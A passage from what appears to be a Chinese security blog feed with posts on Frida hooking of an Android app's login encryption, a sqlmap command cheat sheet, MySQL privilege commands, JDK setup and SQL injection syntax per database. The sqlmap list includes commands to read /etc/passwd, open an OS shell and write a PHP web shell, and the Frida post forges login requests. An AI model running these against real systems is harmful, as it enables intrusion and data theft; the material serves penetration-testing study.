class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">func1: function(str)&#123;  //定义函数名</span></span><br><span class="line"><span class="string">var enc = &#x27;&#x27; </span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">var a = Java.use(&quot;com.picovr.assistantphone.c.a.e&quot;);</span></span><br><span class="line"><span class="string">enc = a.e(str)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">return enc</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">func2: function(str)&#123;  //定义函数名</span></span><br><span class="line"><span class="string"> var sign = &#x27;&#x27; </span></span><br><span class="line"><span class="string"> Java.perform(function () &#123;</span></span><br><span class="line"><span class="string"> var aa = Java.use(&quot;com.blankj.utilcode.util.D&quot;);</span></span><br><span class="line"><span class="string"> sign = aa.d(str)</span></span><br><span class="line"><span class="string"> &#125;);</span></span><br><span class="line"><span class="string"> return sign</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_rpc</span>():</span></span><br><span class="line">    process = frida.get_usb_device(-<span class="number">1</span>).attach(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">    script = process.create_script(test)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#script.exports.func2() //调用方法</span></span><br><span class="line">    <span class="keyword">return</span> script.exports //把exports <span class="keyword">return</span>出去外面</span><br><span class="line">    <span class="comment">#sys.stdin.read()</span></span><br></pre></td></tr></table></figure><p><strong>rpc-hook.py:</strong></p><p>从hook的两个加密函数,远程调用接收返回结果,在利用 requests库进行构造请求,从而达到不去逆向算法,直接调用的曲线救国方法.缺点是大规模发包可能不够稳定.如果放到服务器上可以进行端口转发穿透内网.如果要进一步测试需用flask模块进行中转,可配合sqlmap.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hook  <span class="comment">#引入hook.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exports = jj.start_rpc函数()<span class="comment">#调用hook.py里的start_rpc函数</span></span><br><span class="line">apiaccount = <span class="string">&quot;vrpuc-aaf91f835147ce2d01216bd3bd5c3516&quot;</span></span><br><span class="line">phone = <span class="string">&#x27;18812345600&#x27;</span></span><br><span class="line">pwd= <span class="string">&quot;qwe123456&quot;</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">enc = exports.func1(pwd)  <span class="comment">#传入pwd值并接收返回结果</span></span><br><span class="line">signn = <span class="string">&quot;apiaccount=vrpuc-aaf91f835147ce2d01216bd3bd5c3516&amp;enc=&#123;0&#125;&amp;phone=18812345600&amp;timestamp=&#123;1&#125;&amp;key=a0f723c011346j39w049d7bf0356b34b&quot;</span>.<span class="built_in">format</span>(enc,timestamp)</span><br><span class="line">sign = exports.func2(signn) <span class="comment">#传入signn值并接收返回结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>,sign)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc:&#x27;</span>,enc)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://api.passport.text.com/loginUser&#x27;</span></span><br><span class="line">data= &#123;<span class="string">&quot;apiaccount&quot;</span>:apiaccount,<span class="string">&quot;timestamp&quot;</span>:timestamp,<span class="string">&quot;phone&quot;</span>:phone,<span class="string">&quot;enc&quot;</span>:enc,<span class="string">&quot;sign&quot;</span>:sign&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;api.passport.picovr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;okhttp/3.11.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>:<span class="literal">None</span>    <span class="comment">#把请求参数置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = requests.post(url,data=data,headers=header)</span><br><span class="line">res = ret.text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>请求成功:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;refresh_token&quot;</span>:<span class="string">&quot;LJA0GGff3veBktlBkEnLBmHryI0TAuhDSTups94RWZj4LPKbpQqUZJuvfjvt+8NPaHz41oSyObaLwJYLoUenSQO9g8D37LT3Mw5/RI2FNHHAHDuqJ36cMRlPQy8TgVisHV/pYDlXsVI1a34g9JHSpfqFKgYlaMJaLLM1Fk52924=&quot;</span>,<span class="attr">&quot;user_token_expire_time&quot;</span>:<span class="number">5183999</span>,<span class="attr">&quot;sign&quot;</span>:<span class="string">&quot;6486813B4CDFC31F7A00A9B9C37D0E36&quot;</span>,<span class="attr">&quot;user_fresh_token_expire_time&quot;</span>:<span class="number">5184000</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;009052b7951f4da844be006bd239759ec70493520b992ce37381bb3fd4b0c0fbef7842572a9feb6ecf236ccc89ece46dd6f1afba86d1a403ee801fbbf3c196dd2a96f6770fc0e6a18420ed8aa3093f777342d0fd36dcf1dcaa0815c5aaab85e7a2490-1.0.1&quot;</span>,<span class="attr">&quot;timestamp&quot;</span>:<span class="string">&quot;1647965072111&quot;</span>&#125;,<span class="attr">&quot;ret_msg&quot;</span>:<span class="string">&quot;成功&quot;</span>,<span class="attr">&quot;ret_code&quot;</span>:<span class="string">&quot;success&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap 基础命令</title>
      <link href="/posts/21446/"/>
      <url>/posts/21446/</url>
      
        <content type="html"><![CDATA[<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><ul><li><p>1.<strong>-u url</strong>    检测url是否存在注入</p></li><li><p>2.<strong>-u url  –dbs</strong> 获取所有的库名</p></li></ul><ul><li>3.<strong>-u url  –current-db</strong> 获取当前库名</li></ul><ul><li><p>4.<strong>-u url -D pikachu –table</strong> 获取指定库pikachu的表名</p></li><li><p>5.<strong>-u url -D pikachu -T member –columns</strong> 获取指定库pikachu的member表中的字段名</p></li><li><p>6.<strong>-u url -D pikachu -T member -C username,pw,id –dump</strong> 获取指定字段的数据</p></li><li><p>7.<strong>-u url -D pikachu –dump-all</strong> 获取整个数据库的数据</p></li><li><p>8.<strong>-u url -D pikachu -T member -C username,pw,id –dump –start=1 –stop=5</strong>  获取指定字段的5条数据</p></li><li><p>9.<strong>-u url –purge</strong> 清除缓存进行注入</p></li><li><p>10.<strong>-u url –privileges</strong> 测试所有数据库用户的权限（写文件/操作数据库）</p></li><li><p>11.<strong>-u url –os-cmd=’cat /etc/passwd’ –purge</strong> 执行系统命令cat /etc/passwd</p></li><li><p>12.**-u url –batch **当出现选项的时候，自动填充默认选项</p></li><li><p>13.**-u url –os-shell **返回半交互式命令执行终端</p></li><li><p>14.<strong>-u url –data “uname=1&amp;passwd=1” –batch</strong> 默认跑uname</p></li><li><p>15.**-u url –data “uname=1&amp;passwd=1” –batch -p passwd **指定passwd参数进行测试是否存在sql注入</p></li><li><p>16.<strong>-r 1.txt</strong>(包含http请求的数据包文件)</p></li><li><p>17.**-u url –users –passwords **查询数据库中的用户名以及密码并进行爆破</p></li><li><p>18.**-u url –level 3 **测试更多http部分 3 ua-referer 2-cookie 1-get/post</p></li><li><p>19.<strong>-u url –risk 3</strong> 1-3 三个等级 使用更多的payload进行测试是否存在sql注入</p></li><li><p>20.<strong>-u url -v 3 payload</strong>以及调试信息    0-6 7个等级 </p></li><li><p>21.**-u url –is-dba **测试当前连接数据库用户是否为dba权限</p></li><li><p>22.**-u url –current-db –current-user **显示当前数据库和用户</p></li><li><p>23.**-m url.txt –batch **批量检测url </p></li><li><p>24.**–cookie=”phpsession=asidisjiajsd9291i39i2;uname=admin” –dbs –level 3 –data **</p></li><li><p>*”seachid=123&amp;username=qqq” ** 指定cookie测试注入</p></li><li><p>25.**–random-agent **随机提取ua头进行测试</p></li><li><p>26.**–referer=”<a href="http://www.baidu.com&quot;/">http://www.baidu.com&quot;</a> **指定referer进行测试</p></li><li><p>27.<strong>–time-sec 5 –delay 0.5  –technique=T</strong></p></li><li><p>28.<strong>-u url –sql-query=”select database()”</strong></p></li><li><p>29.<strong>-u url –sql-shell #mysql-shell</strong></p></li><li><p>30.<strong>-u url –sql-file=”sql文件”</strong></p></li><li><p>31.**-u url –file-read ‘/etc/passwd’**读取文件</p></li><li><p>32.**-u url –file-write “1.txt” –file-dest “/var/www/html/shell666.php” **写文件</p></li><li><p>33.**-g “google dork” –batch –random-agent –delay 0.5 –threads 2 –dbs **指定google语法搜索url进行注入</p></li><li><p>34.<strong>–dbms=mysql</strong> 指定数据库为mysql</p></li><li><p>35.**–technique=’BEUSTQ’ **指定sqlmap使用注入技术进行注入</p></li><li><p>36.**–technique=’T’ –time-sec 1 **指定盲注技术进行注入，并指定休眠时间为1s</p></li><li><p>37.**–delay 0.5 **指定sqlmap发送数据包的间隔时间为0.5s</p></li><li><p>38.**sqlmap -l logfile burp—&gt; project options -&gt; misc -&gt; logging **选择不同的模块的req/resp存入日志文件内</p></li><li><p>39.<strong>-u url –force-ssl</strong> 强制走https</p></li><li><p>40.**-u url –chunked **分块传输发送payload测试sql注入绕waf</p></li><li><p>41.**–threads 5 **指定5个线程注入 进程/线程</p></li><li><p>42.**–prefix **添加前缀 #闭合</p><pre><code>    **--suffix **添加后缀   #注释</code></pre></li></ul><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul><li><p>1.<strong>sqlmap -u url –random-agent –delay 0.5 –threads 2 –time-sec 2 –batch sqlmap -u url –safe-url=”<a href="http://url&quot;/">http://url&quot;</a></strong> </p></li><li><p>2.<strong>sqlmap -u url –prefix=”)]” –no-cast –dbs</strong></p></li><li><p>3.<strong>sqlmap -u <a href="https://url/">https://url</a> –force-ssl</strong> </p></li><li><p>4.<strong>sqlmap -u url –tammper=space2comment.py</strong></p></li><li><p>5.<strong>–time-sec 5</strong>指定时间盲注的时间5s</p></li><li><p>6.<strong>–delay 0.5</strong>指定sqlmap每个数据包发包间隔为0.5s</p></li><li><p>7.<strong>–technique=T/E/U/S/B</strong><br>  T = time 时间盲注<br>  E = error 报错注入<br>  U = union 联合查询<br>  S = stacks 堆叠注入<br>  B = Bool    布尔盲注</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql权限控制</title>
      <link href="/posts/3943/"/>
      <url>/posts/3943/</url>
      
        <content type="html"><![CDATA[<p><strong>新建用户并赋予所有权限:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p><strong>操作表新建用户赋予权限:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql.user(Host,<span class="keyword">User</span>,Password,Select_priv,Update_priv,Insert_priv) <span class="keyword">value</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;icq&#x27;</span>,password(<span class="string">&#x27;icq&#x27;</span>),<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>查看用户权限及密码:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;icq&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>删除用户:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> icq@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>收回权限:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">insert</span> <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;icq&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>修改外连:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use mysql; </span><br><span class="line">update <span class="keyword">user</span> <span class="keyword">set</span> host<span class="operator">=</span><span class="string">&#x27;%&#x27;</span> <span class="keyword">where</span> <span class="keyword">User</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> Host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;root&#x27;</span> <span class="keyword">WITH</span></span><br><span class="line"><span class="keyword">GRANT</span> OPTION;</span><br></pre></td></tr></table></figure><p><strong>修改密码:</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> PASSWORD <span class="keyword">FOR</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span> <span class="operator">=</span> PASSWORD(<span class="string">&#x27;newpassword&#x27;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 安装包安装：JDK</title>
      <link href="/posts/63374/"/>
      <url>/posts/63374/</url>
      
        <content type="html"><![CDATA[<p>1）：官方下载对应的.gz包，这里以jdk-8u181-linux-x64.tar.gz为例<br>2）：创建一个目录用于存放解压后的文件，并解压缩到该目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/lib/jvm</span><br><span class="line">sudo tar -zxvf jdk-8u181-linux-x64.tar.gz -C /usr/lib/jvm</span><br></pre></td></tr></table></figure><p>3）：修改环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.bashrc</span><br></pre></td></tr></table></figure><p>4）：文件末尾追加如下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set oracle jdk environment</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/jdk1.8.0_181  <span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span>  </span><br></pre></td></tr></table></figure><p>5）：使环境变量生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><p>6）：设置默认jdk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_181/bin/java 300  </span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_181/bin/javac 300  </span><br><span class="line">sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_181/bin/jar 300   </span><br><span class="line">sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_181/bin/javah 300   </span><br><span class="line">sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_181/bin/javap 300</span><br></pre></td></tr></table></figure><p>7）：执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br></pre></td></tr></table></figure><p>8）：测试是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br><span class="line">javac -version</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现 frida hook一个类并打印所有传参和返回值</title>
      <link href="/posts/42644/"/>
      <url>/posts/42644/</url>
      
        <content type="html"><![CDATA[<h3 id="hook-一个类下所有方法的步骤"><a href="#hook-一个类下所有方法的步骤" class="headerlink" title="hook 一个类下所有方法的步骤:"></a>hook 一个类下所有方法的步骤:</h3><p>第一步:得到这个类下面有哪些方法</p><p>第二步:遍历这些方法</p><p>第三步:得到方法的所有重载</p><p>第四步:遍历重载</p><p>第五步:遍历所有的传参及类型</p><p>第五步:imlementation</p><h3 id="用到的类及方法"><a href="#用到的类及方法" class="headerlink" title="用到的类及方法:"></a><strong>用到的类及方法:</strong></h3><p><strong>java.lang.class</strong></p><p><strong>getDeclaredMethods()</strong> <em>//      返回 Method 对象的一个数组，这些对象反映此 Class 对象表示的类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</em></p><p><strong>getName()</strong>       <em>//      以 String 的形式返回此 Class 对象所表示的实体（类、接口、数组类、基本类型或 void）名称。</em></p><p><strong>arguments</strong>       <em>//      java 的形参集合</em></p><p><strong>argumentType</strong>     <em>//      形参类型</em></p><p><strong><em>JSON</em>.<em>stringify</em>()</strong>       //  js方法将一个JavaScript 对象或值转换为JSON 字符串</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现:"></a>代码实现:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    hookclass(<span class="string">&#x27;com.xbiao.login.PhoneLoginActivity&#x27;</span>) <span class="comment">//hook一个类</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printstack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookclass</span>(<span class="params">className</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Myclasa = Java.use(className)</span><br><span class="line">    <span class="comment">//得到类下的所有方法</span></span><br><span class="line">    <span class="keyword">var</span> methods = Myclasa.class.getDeclaredMethods()</span><br><span class="line">    <span class="comment">//遍历所有方法</span></span><br><span class="line">    methods.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">method</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//获得方法名</span></span><br><span class="line">        <span class="keyword">var</span> methodName = method.getName()</span><br><span class="line">        <span class="comment">//获得该方法得所有重载</span></span><br><span class="line">        <span class="keyword">var</span> overloads = Myclasa[methodName].overloads</span><br><span class="line">        <span class="comment">//遍历重载</span></span><br><span class="line">        overloads.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">overload</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//hook 重载</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> prot = <span class="string">&#x27;(&#x27;</span>       <span class="comment">//组装重载和形参和类型</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;overload.argumentTypes.length; i++)&#123;</span><br><span class="line">                prot += overload.argumentTypes[i].className + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            prot += <span class="string">&#x27;)&#x27;</span></span><br><span class="line">            <span class="keyword">var</span> wMethodName = className+<span class="string">&#x27;.&#x27;</span>+methodName+prot</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;fffffffffffff&#x27;</span>)</span><br><span class="line">            overload.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                printstack()   <span class="comment">//调用关系,打印堆栈</span></span><br><span class="line">                <span class="built_in">console</span>.log(wMethodName)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&#x27;argument:&#x27;</span>+<span class="built_in">JSON</span>.stringify(<span class="built_in">arguments</span>[i]))</span><br><span class="line">                &#125;<span class="comment">//JSON.stringify尽可能的打印更多的传参</span></span><br><span class="line">                <span class="keyword">var</span> ret = <span class="built_in">this</span>[methodName].apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>)</span><br><span class="line">                <span class="built_in">console</span>.log(wMethodName + <span class="string">&#x27;return:&#x27;</span>+<span class="built_in">JSON</span>.stringify(ret))</span><br><span class="line">                <span class="comment">//打印返回值</span></span><br><span class="line">                <span class="keyword">return</span> ret</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Mssql Oracle  Sql注入区别</title>
      <link href="/posts/30529/"/>
      <url>/posts/30529/</url>
      
        <content type="html"><![CDATA[<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><p><strong>information_schema 系统库</strong></p><table><thead><tr><th>表名</th><th>字段</th><th>说明</th></tr></thead><tbody><tr><td>schemata</td><td>–schema_name 库</td><td>存放所有的库名</td></tr><tr><td>tables</td><td>–table_schema 库名字段<br/>–table_name 表名字段</td><td>存放所有的表名</td></tr><tr><td>columns</td><td>–table_schema 库名字段<br/>–table_name 表名字段<br/>–column_name 字段</td><td>存放所有的表字段信息</td></tr></tbody></table><p><strong>拼接:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat concat_ws group_concat</span><br></pre></td></tr></table></figure><p><strong>注释符号</strong> : </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- - </span></span><br><span class="line"># </span><br><span class="line"><span class="comment">/*注释内容*/</span></span><br><span class="line"><span class="comment">/*!50001 select * from test */</span> #这里的<span class="number">50001</span>表示假如 数据库是<span class="number">5.00</span><span class="number">.01</span>以上版本，该语句才会被推行</span><br></pre></td></tr></table></figure><p><strong>limit:limit</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>Time-bool:sleep</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Mssql"><a href="#Mssql" class="headerlink" title="Mssql"></a>Mssql</h2><p>每个数据库下面都有一个视图表,需要跨库查需要前面加库名 如master.information_schema.tables</p><table><thead><tr><th>视图表</th><th>列名</th><th>说明</th></tr></thead><tbody><tr><td>master.dbo.sysdatabases</td><td>name 数据库名</td><td>SQL server中所有的数据库</td></tr><tr><td>[库名].dbo.Sysobjects</td><td>name、id、xtype=’U’</td><td>SQL server中当前用户数据库的表</td></tr><tr><td>[库名].dbo.Syscolumns</td><td>name、ID,id 是用 sysobjects 得到的表的 ID 号</td><td>SQLserver中当前用户数据库的列</td></tr><tr><td>sys.sql_logins</td><td></td><td>SQL server中所有的登录名</td></tr></tbody></table><p><strong>拼接:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+</span><br></pre></td></tr></table></figure><p><strong>注释符号:</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--</span><br></pre></td></tr></table></figure><p><strong>limit:top</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases)</span><br></pre></td></tr></table></figure><p><strong>Time-bool: waitfor delay</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">条件 waitfor delay <span class="string">&#x27;0:0:5&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p>区分大小写<br>from 后必须接表 